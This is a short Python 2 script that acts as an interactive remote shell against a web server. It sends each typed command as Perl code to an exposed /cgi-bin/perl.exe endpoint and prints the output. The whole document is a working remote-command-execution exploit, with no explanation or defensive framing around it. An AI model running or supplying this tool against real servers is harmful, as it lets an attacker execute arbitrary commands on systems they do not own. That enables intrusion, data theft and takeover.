#!/usr/bin/python

import httplib
import readline
import sys

con = httplib.HTTPSConnection(sys.argv[1])

while (True):
  try:
    cmd = raw_input("cmd: ").rstrip()
    cmdr = "print \"Content-type: text/html\\n\\n\";print `"+cmd+"`;"
    con.request("POST","/cgi-bin/perl.exe",cmdr)
    r = con.getresponse()
    data = r.read()
    print "code: "+str(r.status)
    if len(data)>0:
      print data
  except KeyboardInterrupt:
    sys.exit(0)
